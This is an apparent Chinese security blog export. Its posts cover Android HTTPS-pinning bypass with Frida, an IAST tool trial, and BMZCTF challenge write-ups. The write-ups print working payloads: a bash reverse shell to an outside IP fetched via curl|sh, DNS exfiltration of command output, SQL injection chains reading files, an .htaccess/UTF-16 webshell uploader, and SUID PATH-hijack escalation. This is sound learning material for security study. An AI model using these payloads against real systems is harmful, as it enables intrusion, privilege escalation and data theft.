{"meta":{"title":"Misaki's Blog","subtitle":null,"description":"One way to choose one","author":"Misaki","url":"https://misakikata.github.io"},"pages":[{"title":"Me","date":"2018-09-18T03:14:22.000Z","updated":"2019-01-30T08:08:54.000Z","comments":true,"path":"about/index.html","permalink":"https://misakikata.github.io/about/index.html","excerpt":"","text":"关于我Web安全爱好者，python级菜鸟，移动安全进行中，喜欢一些新事物，成功性随机。"}],"posts":[{"title":"Android认证方式和绕过","slug":"Android认证方式和绕过","date":"2021-12-22T08:28:34.000Z","updated":"2021-12-23T08:28:27.718Z","comments":true,"path":"2021/12/Android认证方式和绕过/","link":"","permalink":"https://misakikata.github.io/2021/12/Android%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E5%92%8C%E7%BB%95%E8%BF%87/","excerpt":"","text":"源码源码来自：https://github.com/Ch3nYe/httpstest 参考文章：https://ch3nye.top/Android-HTTPS%E8%AE%A4%E8%AF%81%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%92%8C%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93 打包好的APP，启动目录下的http_server，同时修改host把www.test.com指向本地。包名为：com.example.httpstest 安装后如下所示： 然后为了方便代理，我们安装一个ProxyDroid：https://github.com/madeye/proxydroid 可以从谷歌商店代理下载：https://apkpure.com/store/apps/details?id=org.proxydroid 这个东西是利用Android iptables代理，捕获所有APP数据包。一般做WiFi代理的话，有些流量不会走代理，或者还可以使用VPN的代理模式比如Postern。 一开始的两个直接做了代理就可以抓到，就不演示了。 HTTPS系统证书校验在Android7以上的系统，用户证书不再信任，此处配置证书到系统证书目录。 openssl x509 -inform DER -in burp.der -out cacert.pem openssl x509 -inform PEM -subject_hash_old -in cacert.pem &#x3D;&gt; hash mv cacert.pem &lt;hash&gt;.0 adb push hash.0 &#x2F;sdcard &#x2F;&#x2F;由于系统读写权限问题，不一定能直接上传到system目录。 mount -o remount,rw &#x2F;system &#x2F;&#x2F;root权限下执行 cp &#x2F;sdcard&#x2F;hash.0 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F; chmod 644 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;hash.0 第一行就是那个hash 后续点击执行 SSLPINNING 代码校验这里的校验是公钥，由于中间穿插了burp，所以burp即是客户端，又是服务端，app校验的是burp的公钥导致校验失败。此处使用的是frida，先去下载frida：https://github.com/frida/frida/releases adb push frida-server &#x2F;data&#x2F;local&#x2F;tmp adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:27043 cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F; chmod 755 frida-server .&#x2F;frida-server 作者提供了一个frida脚本，但是按照使用方式我这边会重启模拟器，也许是模拟器的原因？这里按照一个python脚本来调用这个js脚本。 #coding:utf8 import frida, sys,os,json,codecs import subprocess import time import ctypes if (len(sys.argv) &#x3D;&#x3D; 3): jsfile &#x3D; str(sys.argv[1].strip()) package_name &#x3D; str(sys.argv[2]).strip() else: print &quot;Usage: python frida_attach.py [hook.js] [package_name] &quot; sys.exit(1) def print_result(message): print (&quot;[!] Received: [%s]&quot; %(message)) def stringFromArray(data): ret &#x3D; &#39;&#39; for i in data: value &#x3D; ctypes.c_uint8(i).value if value &#x3D;&#x3D; 0: continue if value &lt;&#x3D;127: ret +&#x3D; chr(value) else: ret +&#x3D; &#39;\\\\x&#39; + hex(value)[2:] return ret def hex_stringFromArray(data): ret &#x3D; &#39;[&#39; for i in data: value &#x3D; ctypes.c_uint8(i).value ret +&#x3D; hex(value) + &quot;,&quot; return ret + &quot;]&quot; def on_message(message, data): print(data) if &#39;payload&#39; in message: data &#x3D; message[&#39;payload&#39;] if type(data) is list: print stringFromArray(data) else: print data else: if message[&#39;type&#39;] &#x3D;&#x3D; &#39;error&#39;: print (message[&#39;stack&#39;]) else: print message def main(): with codecs.open(jsfile, &#39;r&#39;, encoding&#x3D;&#39;utf8&#39;) as f: jscode &#x3D; f.read() process &#x3D; frida.get_device_manager().enumerate_devices()[-1].attach(package_name) script &#x3D; process.create_script(jscode) script.on(&#39;message&#39;, on_message) script.load() sys.stdin.read() if __name__ &#x3D;&#x3D; &#39;__main__&#39;: main() 执行如下后，就可以bypass。 python .\\frida_attach.py .\\new_sslpinning.js httpstest 配置文件校验跟上面的形式差不多，只是一个代码实现，一个在res/xml/network_security_config.xml配置文件中实现。 单向校验的话，还可以使用Xposed和justtrustme一起配合来绕过。 双向校验需要先启动目录下的http_server服务，如果访问的话，浏览器会显示异常的链接请求。 需要先把certs目录下的client.p12安装到访问浏览器，密码是clientpassword。再去访问浏览器发现可以显示，同样需要把证书加到burp，让证书可以用证书进行认证。 在user options – TLS – Client TLS certificates中添加，填入域名www.test.com，输入密码即可。 也就是如果需要绕过这种双向验证，需要客户端的证书来对请求进行身份验证。一般情况下这个证书获取从APP 解压，查看assets或者res目录内，查找是否有pfx、cer、p12格式的证书。最后我们需要导入p12的证书。 frida(1)当然不少的APP可能存在加壳加密等办法，证书和密码的获取不是那么简单，这里提供一种利用frida来获取证书和密钥的办法。 下载frida-extract-keystore：https://gist.github.com/ceres-c/cb3b69e53713d5ad9cf6aac9b8e895d2 运行脚本后，会自动的启动APP，需要在脚本内修改APP包名，点击需要执行的功能，也就是触发请求。 脚本会自动抓取写在代码内的密码和保存证书，以jks的形式。然后需要去提取公钥。 keytool -list -rfc -keystore .\\keystore1.jks -storepass clientpassword 把显示的内容保存在cer格式的证书中。导出私钥先转换为pfx。 keytool -v -importkeystore -srckeystore server.jks -srcstoretype jks -srcstorepass clientpassword -destkeystore server.pfx -deststoretype pkcs12 -deststorepass clientpassword -destkeypass 12345678 利用pfx导出key，密码还是上面查到的密码 openssl pkcs12 -in server.pfx -nocerts -nodes -out server.key 再利用key和证书生成p12证书，可以导入burp的那种，密码是我们上面设置的12345678。 openssl pkcs12 -export -clcerts -in client-cert.cer -inkey client-key.key -out client.p12 当没有配置证书的时候，抓包显示Communication error。配置进行这个p12。密码为12345678 再次访问即可成功。 frida(2)如果能获取证书，但是需要查找密码，而又懒得去解包或者不好脱壳，可以尝试查密码的frida脚本。 frida js ：https://raw.githubusercontent.com/m0bilesecurity/Frida-Mobile-Scripts/master/Android/tracer_keystore.js 使用上面的python2脚本来调用。 python .\\frida_attach.py .\\tracer_keystore.js httpstest 点击触发功能，会显示如下 由于可以解包获取其中的p12证书，所以直接导入证书和密码到burp即可。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"洞态IAST初使用","slug":"洞态IAST初使用","date":"2021-12-09T03:10:04.000Z","updated":"2021-12-09T03:15:38.506Z","comments":true,"path":"2021/12/洞态IAST初使用/","link":"","permalink":"https://misakikata.github.io/2021/12/%E6%B4%9E%E6%80%81IAST%E5%88%9D%E4%BD%BF%E7%94%A8/","excerpt":"","text":"安装按照官方文档，https://doc.dongtai.io/02_start/index.html 使用docker来安装，直接执行 git clone https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai.git cd deploy&#x2F;docker-compose&#x2F; .&#x2F;dtctl install -v 1.1.2 不过这个创建docker有一个问题就是，openapi的端口没有被开启，修改dtctl，给openapi添加端口。这个端口的开启在1.0.5中，需要自己去填写openapi。 dongtai-openapi: image: &quot;dongtai.docker.scarf.sh&#x2F;dongtai&#x2F;dongtai-openapi:$CHANGE_THIS_VERSION&quot; restart: always ports: - &quot;8000:8000&quot; 使用账号密码admin/admin登陆，查看状态监控，基本就是如下显示 初测试下载agent，此处使用IDEA来配置，在启动参数中添加，此处使用一个Spring的项目Ruoyi4.6版本。 洞态这边会显示一个agent： 我们在ruoyi的后台点点点 在洞态那边可以看到已经有一堆数据过来了 旁边还存在依赖检测 只不过这个检测注入有点问题，比如上面检测到pageSize存在问题，我们跟随调试一下。进行到如下代码，此处意思是获取参数名。 这里获取参数中排序的参数值此处是传输的asc 下面的getPageSize是获取参数PageSize，但是这个函数返回类型是Integer。所以当传输一些字符返回的是null。 num和size不为null的时候，这里getOrderBy把参数orderByColumn和isAsc进行了拼接，escapeOrderBySql把参数值进行了一次判断，正则匹配字母数字和下划线，逗号，点。如果想靠这两个参数拼接也不行。 这个版本存在一个注入，而这个注入跟这个参数其实没啥关系，ruoyi使用了mybatis，上面这个功能点确实是存在问题，查看sql的目录文件SysRoleMapper.xml。 找到id为selectRoleList，下面就可以看到了，其实是用了$来传参。 但是这个参数并不能直接利用，因为这个参数不在上面这个请求里。需要手动添加一下 这个功能上确实是存在注入问题，但是检测没有找准参数，这个点也许是由于这个参数不存在的原因，导致检测存在一些偏差。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"BMZCTF做题记录","slug":"BMZCTF做题记录","date":"2021-10-19T03:00:14.000Z","updated":"2021-10-19T03:02:35.695Z","comments":true,"path":"2021/10/BMZCTF做题记录/","link":"","permalink":"https://misakikata.github.io/2021/10/BMZCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"","text":"端午就该吃粽子访问login.php，会给一个这样的链接http://www.bmzclub.cn:22937/login.php?zhongzi=show.php 看样子是文件读取的漏洞，尝试读取一个passwd文件。 可以直接读取，再去试试根目录下的flag文件，提示你是偷粽子的。从匹配上看是只要存在flag这个词就不行。 尝试利用远程包含，屏蔽了http关键词。file没有屏蔽，但是不能读取flag。那就尝试一下伪协议。 php://input不给用，都会报错。 尝试读取的命令php://filter php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;show.php 解编码后发现是页面的HTML源码。里面注释了index.php。读取发现是如下php代码 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php &lt;?php error_reporting(0); if (isset($_GET[&#39;url&#39;])) &#123; $ip&#x3D;$_GET[&#39;url&#39;]; if(preg_match(&quot;&#x2F;(;|&#39;| |&gt;|]|&amp;| |python|sh|nc|tac|rev|more|tailf|index|php|head|nl|sort|less|cat|ruby|perl|bash|rm|cp|mv|\\*)&#x2F;i&quot;, $ip))&#123; die(&quot;&lt;script language&#x3D;&#39;javascript&#39; type&#x3D;&#39;text&#x2F;javascript&#39;&gt; alert(&#39;no no no!&#39;) window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;); &#125;else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123; die(&quot;&lt;script language&#x3D;&#39;javascript&#39; type&#x3D;&#39;text&#x2F;javascript&#39;&gt; alert(&#39;no flag!&#39;) window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;); &#125; $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip); echo $a; &#125; ?&gt; 其中可以看到的是，基本过滤了文件读取的命令和常见反弹shell的方式，然后还不准同时出现flag这四个字符。 上面过滤的命令中，恰好有一个tail没有过滤，也就是使用这个来读取flag。 尝试先执行个命令看看 然后tail去读文件，但是空格被禁用了，fuzz一下发现可以使用%09，但是还有flag不能用。这个可以使用通配符来绕过读取，最后就是 index.php?url&#x3D;127.0.0.1||tail%09&#x2F;fla? hitcon_2017_ssrfme访问给出的地址，首页是一段PHP代码 &lt;?php $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); ​ $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info &#x3D; pathinfo($_GET[&quot;filename&quot;]); $dir &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); 看代码是使用IP地址来生成一个目录，这个目录我们可以根据自己的出口IP来确认，然后使用shell_exec来执行命令。使用传入的文件名参数进行创建目录，如果存在目录则去掉点，应该是防止目标遍历，最后生成文件名的文件，写入shell_exec执行的结果。 一开始还以为是需要执行命令来看，先来看看大概的执行结果，发现写入的是首页。才想起来这是个SSRF的题。 &#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&amp;filename&#x3D;123.123 尝试利用file协议来读取flag &#x2F;?url&#x3D;file:&#x2F;&#x2F;&#x2F;flag&amp;filename&#x3D;123.123 利用orange和IP生成md5，到指定目录下查看文件 &#x2F;sandbox&#x2F;8c2xxx9c5&#x2F;123.123 n1ctf/hard_php 一个登陆页面，按照惯例查看是否使用是文件包含读取，修改login为index，发现有登陆验证跳转，修改为 &#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 尝试去读取flag WEB_penetration这个题目稍微有点奇怪，一直在报错，不确定是不是程序问题。代码为： &lt;?php highlight_file(__FILE__); if(isset($_GET[&#39;ip&#39;]))&#123; $ip &#x3D; $_GET[&#39;ip&#39;]; $_&#x3D;array(&#39;b&#39;,&#39;d&#39;,&#39;e&#39;,&#39;-&#39;,&#39;q&#39;,&#39;f&#39;,&#39;g&#39;,&#39;i&#39;,&#39;p&#39;,&#39;j&#39;,&#39;+&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;\\&lt;&#39;,&#39;\\&gt;&#39;,&#39;o&#39;,&#39;w&#39;,&#39;x&#39;,&#39;\\~&#39;,&#39;\\:&#39;,&#39;\\^&#39;,&#39;\\@&#39;,&#39;\\&amp;&#39;,&#39;\\&#39;&#39;,&#39;\\%&#39;,&#39;\\&quot;&#39;,&#39;\\*&#39;,&#39;\\(&#39;,&#39;\\)&#39;,&#39;\\!&#39;,&#39;\\&#x3D;&#39;,&#39;\\.&#39;,&#39;\\[&#39;,&#39;\\]&#39;,&#39;\\&#125;&#39;,&#39;\\&#123;&#39;,&#39;\\_&#39;); $blacklist &#x3D; array_merge($_); foreach ($blacklist as $blacklisted) &#123; if (strlen($ip) &lt;&#x3D; 18)&#123; if (preg_match (&#39;&#x2F;&#39; . $blacklisted . &#39;&#x2F;im&#39;, $ip)) &#123; die(&#39;nonono&#39;); &#125;else&#123; exec($ip); &#125; &#125; else&#123; die(&quot;long&quot;); &#125; &#125; &#125; ?&gt; 这个代码看起来是屏蔽了很多关键词，实际上是一个词匹配去查一次，也就是总共进行很多次匹配，有一次符合最后则返回nonono。那么也就是只需要第一次绕过这个过滤就算后面匹配到，命令依然执行了，所以限制只有长度不超过十八即可。但是结果并不会显示，所以我们需要进行一定的外带的办法。 &#x2F;?ip&#x3D;ls+&#x2F;&gt;1.txt flag并不在根目录，查看其他目录。没有发现其他可读目录下存在，那可能在root目录，需要一定的提权方式，这种读写的办法就不太适用了。 想办法反弹一个shell出来，由于长度限制，此处不直接使用IP，转为十进制IP。利用如下 /?ip=curl+1093xxx907|shweb服务使用flask搭建，写一个简单的返回。@app.route(&#39;/&#39;)def hello_world(): return &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/65.49.209.99/8888 0&gt;&amp;1&#34;&#39; 查找有没有可用的SUID find / -perm -u=s -type f 2&gt;/dev/null 其中有一个奇怪的love程序，执行后类似是PS的查看进程的结果。所以可能需要劫持PS命令来提取。 cd /tmpecho &#34;/bin/bash&#34; &gt; pschmod 777 psecho $PATHexport PATH=/tmp:$PATH 再去执行love，即可调用当前tmp目录下的ps命令，获取到一个root的shell。 其中demo.c应该就是love的源代码 # cat demo.c#include&lt;unistd.h&gt;void main(){ setuid(0); setgid(0); system(&#34;ps&#34;);} 流量监控平台WEb界面需要登陆，账号admin/123456登陆。 可以执行命令，看样子是绕过命令执行。由于不回显，所以使用DNS外带的方式。先测试一下可能使用的命令，发现常用的命令不能使用，比如ping,curl等会报错，采用单引号分隔绕过黑名单。还在报错，测试发现是拦截了空格。使用%09绕过。 ord=ls;pi&#39;&#39;ng%09byvdxx.dnslog.cn 发现可行，然后使用ceye的监听平台 ord=ls;pi&#39;&#39;ng%09`whoami`.xxxxb4.ceye.io 查看flag ord=ls;pi&#39;&#39;ng%09`cat%09/flag`.r9rub4.ceye.io rctf2015_easysql打开是一个注册登陆页面，需要先注册个账号登陆，里面就是一些有的没得功能，还有一个修改密码。既然是注入，那就先把注册登陆看看有没有注入点，但是在注册的时候有过滤。 按照惯例，可能是二次注入，注册一个存在问题的用户名，然后在后续调用的时候触发注入，后续调用明显就是修改密码，这里只传输密码，那可能就是从session获取用户名。先去看看怎么构造能报错啥的。 从过滤上看and,or,空格等都被过滤掉了。有几个是注册成功的先去查看一下 登陆admin%22%2f%2a的时候，去修改密码功能，发现报错 从报错上看SQL语句大概是 update user set pwd=&#34;xxxx&#34; where username=&#34;admin&#34;/*&#34; and pwd=&#39;698d51a19d8a121ce581499d7b701668&#39;; 构造一个报错语句 username=1&#34;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))# 但是上面这个语句并不能使用，其中有空格和and符，修改为如下： username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0buser()),0x7e),1))# 登陆再去修改密码，发现可以正常执行，那就查库查表查字段一条龙服务。 当前库web_sqli username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0bdatabase()),0x7e),1))# 查看库内的表，正好第一次就是flag表 username=1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(table_name),0x7e)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#39;web_sqli&#39;%0blimit%0b1,1),1))# 查看字段，就存在一个flag字段 1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;flag&#39;%0blimit%0b0,1),1))# 查看字段值，显示RCTF&#123;Good job! But flag not her，啊这。。。 1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,flag,0x7e)from%0bflag%0blimit%0b0,1)%0b,1))# 懂了，那个flag表是骗人的。再查询一遍还有article表和users表，用users表来查找。终于在字段中查到一个real_flag_1s_here 1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;users&#39;%0blimit%0b3,1),1))# 再来查看字段值，limit查看都是一个个xxx，直接聚合输出 1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(select%0bgroup_concat(real_flag_1s_here)from%0busers),0x7e))%0b,1))# 啊这。。。好家伙，不够长的。。。那就还是一个个输出，先用Intruder批量注册。然后用下面的脚本查看。 #coding:utf-8import requestsimport reheaders = { &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;, &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#39;, &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;, &#39;Referer&#39;: &#39;http://www.bmzclub.cn:22937/changepwd.php&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9,en;q=0.8&#39;, &#39;Cookie&#39;: &#39;Hm_lvt_d7a3b863d5a302676afbe86b11339abd=1631932461,1632274696,1632620435; session=5424329c-1b2e-4349-b4e1-0d2f55c408c5; PHPSESSID=1h1clgvbkvn31qbng29c0m8mr6; Hm_lpvt_d7a3b863d5a302676afbe86b11339abd=1632637433; td_cookie=468906102&#39;}for i in range(1, 21): data = &#39;username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0breal_flag_1s_here%0bfrom%0busers%0blimit%0b{id},1),0x7e),1))#&amp;password=111&#39;.format(id=str(i)) r = requests.post(&#39;http://www.bmzclub.cn:22937/login.php&#39;, headers=headers, data=data) r = requests.post(&#39;http://www.bmzclub.cn:22937/changepwd.php&#39;, headers=headers, data=&#34;oldpass=111&amp;newpass=111&#34;) print(re.findall(&#39;XPATH syntax error: (.*)&#39;, r.text)) 结果全是xxx，啊这，给孩子整不会了。这难道就是0 Solver的原因？ TCTF2019_Wallbreaker_Easy提示如下 蚁剑连接页面，这个是需要绕过disable_functions，phpinfo里紧了一堆函数 既然是7.2的PHP，那就蚁剑php7-backtrace-bypass一把嗖。 insomniteaser_2019_l33t_hoster此问题并没有正确解出，本来使用大小写后缀外加图片马来绕过限制，但是发现并不会当作php执行。所以此处使用WP复现 首先是代码 $disallowed_ext = array( &#34;php&#34;, &#34;php3&#34;, &#34;php4&#34;, &#34;php5&#34;, &#34;php7&#34;, &#34;pht&#34;, &#34;phtm&#34;, &#34;phtml&#34;, &#34;phar&#34;, &#34;phps&#34;,);if (isset($_POST[&#34;upload&#34;])) { if ($_FILES[&#39;image&#39;][&#39;error&#39;] !== UPLOAD_ERR_OK) { die(&#34;yuuuge fail&#34;); } $tmp_name = $_FILES[&#34;image&#34;][&#34;tmp_name&#34;]; $name = $_FILES[&#34;image&#34;][&#34;name&#34;]; $parts = explode(&#34;.&#34;, $name); $ext = array_pop($parts); if (empty($parts[0])) { array_shift($parts); } if (count($parts) === 0) { die(&#34;lol filename is empty&#34;); } if (in_array($ext, $disallowed_ext, TRUE)) { die(&#34;lol nice try, but im not stupid dude...&#34;); } $image = file_get_contents($tmp_name); if (mb_strpos($image, &#34;&lt;?&#34;) !== FALSE) { die(&#34;why would you need php in a pic.....&#34;); } if (!exif_imagetype($tmp_name)) { die(&#34;not an image.&#34;); } $image_size = getimagesize($tmp_name); if ($image_size[0] !== 1337 || $image_size[1] !== 1337) { die(&#34;lol noob, your pic is not l33t enough&#34;); } $name = implode(&#34;.&#34;, $parts); move_uploaded_file($tmp_name, $userdir . $name . &#34;.&#34; . $ext);} 黑名单限制文件后缀，本来看到in_array中带了true，还以为是大小写绕过。实际是使用htaccess文件来定义文件解析类型。 上传.htaccess文件。此处由于会对文件名做处理，所以需要使用..htaccess文件来绕过执行，使得能正确保存文件。 $parts = explode(&#34;.&#34;, $name); #Array([0] =&gt; [1] =&gt; [2] =&gt; htaccess) $ext = array_pop($parts); #htaccess if (empty($parts[0])) { #true array_shift($parts); #返回删除的&#39;&#39;，还剩$parts[1] =&gt; &#39;&#39; } if (count($parts) === 0) { #false count=1 die(&#34;lol filename is empty&#34;); } ..... $name = implode(&#34;.&#34;, $parts); #返回空，所以后续拼接的时候就是$userdir . &#34;.&#34; . $ext 剩下的就是图片大小的问题，WP采用的图片格式为XBM格式，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。 前两个#defines指定位图的高度和宽度（以像素为单位），比如以下xbm文件： #define test_width 16#define test_height 7static char test_bits[] = {0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 }; 后续就是绕过&lt;?这种过滤，WP解释由于使用PHP7.2，所以&lt;script&gt;指定语言的方式不能使用，这个没看出来PHP的版本。采用UTF-16大端编码格式，用一张图表示,utf-8一个字符一个字节，现在utf-16是两个字节编码一个字符。 所以利用如下脚本生成 #!/usr/bin/python3SIZE_HEADER = b&#34;\\n\\n#define width 1337\\n#define height 1337\\n\\n&#34;def generate_php_file(filename, script): phpfile = open(filename, &#39;wb&#39;) phpfile.write(script.encode(&#39;utf-16be&#39;)) phpfile.write(SIZE_HEADER) phpfile.close()def generate_htacess(): htaccess = open(&#39;..htaccess&#39;, &#39;wb&#39;) htaccess.write(SIZE_HEADER) htaccess.write(b&#39;AddType application/x-httpd-php .php16\\n&#39;) htaccess.write(b&#39;php_value zend.multibyte 1\\n&#39;) htaccess.write(b&#39;php_value zend.detect_unicode 1\\n&#39;) htaccess.write(b&#39;php_value display_errors 1\\n&#39;) htaccess.close() generate_htacess()generate_php_file(&#34;webshell.php16&#34;, &#34;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&#34;)generate_php_file(&#34;scandir.php16&#34;, &#34;&lt;?php echo implode(&#39;\\n&#39;, scandir($_GET[&#39;dir&#39;]));?&gt;&#34;) 由于设置了diable，所以不能执行命令，如果需要考虑绕过的形式，可以利用蚁剑来直接执行。或者利用文件读取的shell。直接读取flag。 2018网鼎杯Comment打开页面是一个留言板，留言会显示需要登陆，已经给了一个账号，zhangwei，但是密码不对，既然给了一个账号那就爆破一下密码，发现常规密码都不对，再次看密码格式三个星号可能代表需要爆破这三位？ 设置数字爆破到密码为zhangwei666。 发帖后发现可以查看详情并且再去留言，可能是二次注入？使用一个异常的发帖后，再去给这个帖子提交留言，发现不能显示，可能是有问题。 试了一圈发现不太行，可能是需要组合利用，那还需要源代码查看。扫描一下目录。 发现一堆git泄露，好家伙在这等我呢。 找到一个write_do.php文件。 &lt;?phpinclude &#34;mysql.php&#34;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){ header(&#34;Location: ./login.php&#34;); die();}if(isset($_GET[&#39;do&#39;])){switch ($_GET[&#39;do&#39;]){case &#39;write&#39;: $category = addslashes($_POST[&#39;category&#39;]); $title = addslashes($_POST[&#39;title&#39;]); $content = addslashes($_POST[&#39;content&#39;]); $sql = &#34;insert into board set category = &#39;$category&#39;, title = &#39;$title&#39;, content = &#39;$content&#39;&#34;; $result = mysql_query($sql); header(&#34;Location: ./index.php&#34;); break;case &#39;comment&#39;: $bo_id = addslashes($_POST[&#39;bo_id&#39;]); $sql = &#34;select category from board where id=&#39;$bo_id&#39;&#34;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)[&#39;category&#39;]; $content = addslashes($_POST[&#39;content&#39;]); $sql = &#34;insert into comment set category = &#39;$category&#39;, content = &#39;$content&#39;, bo_id = &#39;$bo_id&#39;&#34;; $result = mysql_query($sql); } header(&#34;Location: ./comment.php?id=$bo_id&#34;); break;default: header(&#34;Location: ./index.php&#34;);}}else{ header(&#34;Location: ./index.php&#34;);}?&gt; 字段都是直接拼接，但是使用了addslashes转义字段。查找一下绕过的方式 1：字符编码问题导致绕过1.1、设置数据库字符为gbk导致宽字节注入1.2、使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入2：编码解码导致的绕过2.1、url解码导致绕过addslashes2.2、base64解码导致绕过addslashes2.3、json编码导致绕过addslashes3：一些特殊情况导致的绕过3.1、没有使用引号保护字符串，直接无视addslashes3.2、使用了stripslashes3.3、字符替换导致的绕过addslashes 不过这个地方既没有编解码的函数也没有字符编码的设置，还使用了单引号闭合。理论上按照闭合那一套是不能注入的。但是现在有个问题是 $category = mysql_fetch_array($result)[&#39;category&#39;]; 如上获取数据的时候，没有使用转义函数，后续直接进行的拼接。addslashes函数转义保存到数据库的时候，反引号是不保存到数据库的，也就是\\&#39;保存到数据库就变成了’单引号。 也就是需要我们在发帖的时候保存category字段一个注入的代码，在留言评论的时候来触发他。 先来构造一下SQL语句，既然是insert注入，那就用盲注，构造如下语句。 insert into comment set category = &#39;111&#39; and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0),#&#39;, content = &#39;$content&#39;, bo_id = &#39;$bo_id&#39; 先来发个帖子，咱来评论留言，发现SQL被执行。 既然user是r开头的，那估计也就是root@localhost了，查库表。本来写个脚本执行，但是发现总是请求过多，响应超时。 搞了半天总是报错，就看看能不能报错回显出来，本地测试一个报错回显的语句，这样写能成功，但是需要出单引号，上面的语句只能闭合不能出去。 insert into usersset id = 55,username = updatexml(1,concat(0x7e,(version())),0),password = &#39;11111&#39;; 这是个多行的SQL语句，可以使用多行注释来拼接，然后再写一个参数进去，类似如下： insert into comment set category = &#39;111&#39;,/*&#39;, content = &#39;*/ content=updatexml(1,concat(0x7e,(version())),0),#&#39;, bo_id = &#39;$bo_id&#39; 试了半天也没结果，然后才想起来这报错不会被写进去，直接报错去了。。。 既然能写进去，那就直接执行，不需要报错语句，测试以下语句。 insert into comment set category = &#39;111&#39;,/*&#39;, content = &#39;*/ content=version(),#&#39;, bo_id = &#39;$bo_id&#39; 回显如下 想了一圈子发现还是最简单的方式能直接使用。查库名为ctf。如下查询表的时候注意要括号包裹不然会报错。 insert into comment set category = &#39;111&#39;,/*&#39;, content = &#39;*/ content=(select group_concat(table_name) from information_schema.tables where table_schema=database()),#&#39;, bo_id = &#39;$bo_id&#39; 查询字段名，主要表名要十六进制形式，查询user表。 content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x75736572),#&amp;bo_id=1 查字段信息，就一个zhangwei。 content=*/+content=(select+group_concat(username)+from+ctf.user),#&amp;bo_id=1 换一个表查，board表。hex值为0x626f617264。字段有：id,category,title,content content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x626f617264),#&amp;bo_id=1 这几个字段查了一遍还是没有信息，表comment也没有信息，这就有意思了。不在数据库里，SQL还能干啥，毕竟是root权限，试试能不能写文件。 试了一番发现并不能愉快的写文件，或者目录是特定目录。文件不给写试试能不能读。 content=*/+content=(SELECT+LOAD_FILE(0x2f6574632f706173737764)),#&amp;bo_id=2 好家伙 又是一个花式文件读取。直接读取根目录下的flag文件 content=11*/+content=(SELECT+LOAD_FILE(0x2f666c6167)),#&amp;bo_id=3 asis_2019_unicorn_shop访问首页是一个购买网页，需要购买独角兽。但是我们没有钱，明显买不了。随便输入一个数 发现需要一个Unicode的编码参数，而且用了unicodedata.numeric来处理输入的值。意思是将Unicode转为等效的数值，那么可能就是Unicode编码转换中绕过数值购买判断。 其中最贵的是1337，那么需要找到一个转换后大于等于1337的Unicode码。 选择如下的符号：https://www.compart.com/en/unicode/U+10123 